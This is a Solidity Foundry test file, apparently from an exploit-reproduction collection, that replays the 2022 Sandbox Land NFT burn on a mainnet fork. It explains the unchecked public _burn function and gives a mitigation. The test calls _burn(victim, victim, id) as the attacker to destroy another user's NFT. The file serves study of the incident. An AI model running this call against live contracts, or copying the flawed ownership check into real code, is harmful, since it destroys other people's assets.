// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";

// forge test --match-contract Exploit_SandBox -vvv
/*
On Feb 08, 2022 an attacker burned a Sandbox Land NFT from another user without their consent by
calling a public burn function that did not check the ownership of the caller.

// Attack Overview
Total Lost: 
Attack Tx: https://etherscan.io/tx/0x34516ee081c221d8576939f68aee71e002dd5557180d45194209d6692241f7b1
Ethereum Transaction Viewer: 

Exploited Contract: https://etherscan.io/address/0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a#code
Attack Block:  14163042

// Key Info Sources
Writeup: https://slowmist.medium.com/the-vulnerability-behind-the-sandbox-land-migration-2abf68933170

Principle: Non Access Controlled Burn function

    function _burn(address from, address owner, uint256 id) public {
        require(from == owner, "not owner");
        _owners[id] = 2**160; // cannot mint it again
        _numNFTPerAddress[from]--;
        emit Transfer(from, address(0), id);
    }


ATTACK:
The function is public and instead of checking that the sender is the owner, 
compares the from and owner being both function parameters. Simply call _burn(someone, someone, id) targeting other's token...

MITIGATIONS:
1) Check that the sender is approved or the owner for that token instead of checking if some user-input parameters are equal.

*/

interface ILand {
  function _burn(
    address from,
    address owner,
    uint256 id
  ) external;
  function _numNFTPerAddress(address) external view returns (uint256);
}

contract Exploit_SandBox is TestHarness{
    address internal attacker = 0x6FB0B915D0e10c3B2ae42a5DD879c3D995377A2C;
    address internal victim = 0x9cfA73B8d300Ec5Bf204e4de4A58e5ee6B7dC93C;

    ILand internal land = ILand(0x50f5474724e0Ee42D9a4e711ccFB275809Fd6d4a);

    function setUp() external {
        cheat.createSelectFork('mainnet', 14163041); // We pin one block before the exploit happened.

    }

    function test_attack() external {
        console.log('------- INITIAL NFT BALANCE OF VICTIM -------');
        console.log(land._numNFTPerAddress(victim));

        cheat.prank(attacker);
        land._burn(victim, victim, 3738);
        console.log('------- FINAL NFT BALANCE OF VICTIM -------');
        console.log(land._numNFTPerAddress(victim));
    }
}